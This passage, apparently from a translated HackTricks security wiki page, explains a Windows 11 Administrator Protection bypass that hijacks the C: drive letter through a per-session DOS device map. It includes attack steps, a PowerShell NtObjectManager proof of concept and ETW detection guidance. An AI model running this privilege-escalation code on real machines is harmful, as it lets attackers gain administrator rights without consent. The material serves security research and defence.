../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Utekaji nyara wa drive-letter wa Administrator Protection (preview) kupitia per-logon-session DOS device map

> [!NOTE]
> Kufikia Agosti 2026, Microsoft bado inaandika Administrator Protection kama **Insider preview**: rollout ya Oktoba 2025 ilirudishwa nyuma na imepangwa kwa wakati wa baadaye. Thibitisha kwamba **Admin Approval Mode with Administrator protection** imewezeshwa kwa hakika na kifaa kimeanzishwa upya kabla ya kujaribu chain hizi; string ya toleo la stock 25H2 pekee haithibitishi kuwa feature hiyo inatumika.<sup>[[10]](#references)</sup>

Kwa attack surface kamili ya `RAiLaunchAdminProcess` / UIAccess kwenye preview builds za Windows 11 25H2, angalia ukurasa maalum:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” hutumia shadow-admin tokens zilizo na `\Sessions\0\DosDevices/<LUID>` maps za kila session. Saraka huundwa kwa kuchelewa na `SeGetTokenDeviceMap` wakati wa resolution ya kwanza ya `\??`. Ikiwa mshambuliaji ata-impersonate shadow-admin token katika kiwango cha **SecurityIdentification** pekee, saraka huundwa huku mshambuliaji akiwa **owner** (inarithi `CREATOR OWNER`), hivyo kuwezesha drive-letter links zinazotangulia `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Hatua:**

1. Kutoka kwenye session yenye privileges ndogo, ita `RAiProcessRunOnce` ili kuzalisha `runonce.exe` ya shadow-admin isiyoonyesha prompt.
2. Duplicate primary token yake kuwa tokeni ya **identification** na kui-impersonate wakati wa kufungua `\??` ili kulazimisha uundaji wa `\Sessions\0\DosDevices/<LUID>` ikiwa chini ya umiliki wa mshambuliaji.
3. Unda symlink ya `C:` hapo inayoelekeza kwenye storage inayodhibitiwa na mshambuliaji; ufikiaji wa filesystem unaofuata katika session hiyo uta-resolve `C:` kwenda kwenye attacker path, na kuwezesha DLL/file hijack bila prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Kwenye preview hosts, Administrator Protection hurekodi approvals na failures kama matukio ya ETW **15031** na **15032** chini ya provider wa `Microsoft-Windows-LUA`. Matukio hayo yanajumuisha SID ya requester, path ya application, outcome, managed administrator account, na authentication method, kwa hivyo majaribio ya exploit yanayorudiwa au kuendesha UI bila mafanikio hayawezi kukosa telemetry.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jinsi User Account Control inavyofanya kazi](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Mkusanyiko wa mbinu za kupita UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Kichanganuzi cha uoanifu na kizindua cha kupita UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI Inatumia AI kutengeneza PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operesheni TrueChaos: Unyonyaji wa 0-Day dhidi ya Malengo ya Serikali za Asia ya Kusini-Mashariki](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Kupita Ulinzi wa Wasimamizi wa Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Kupita UAC kwa kutumia Task ya SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Njia za kupita Always Notify za UnifiedConsent, TabTip na Narrator](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Ulinzi wa msimamizi](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Kuita Seva za RPC za Windows za Ndani kutoka .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte Inaboresha CoolClient kwa Rootkit ya Kernel ya Windows Iliyotiwa Sahihi](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
{{#include ../../banners/hacktricks-training.md}}
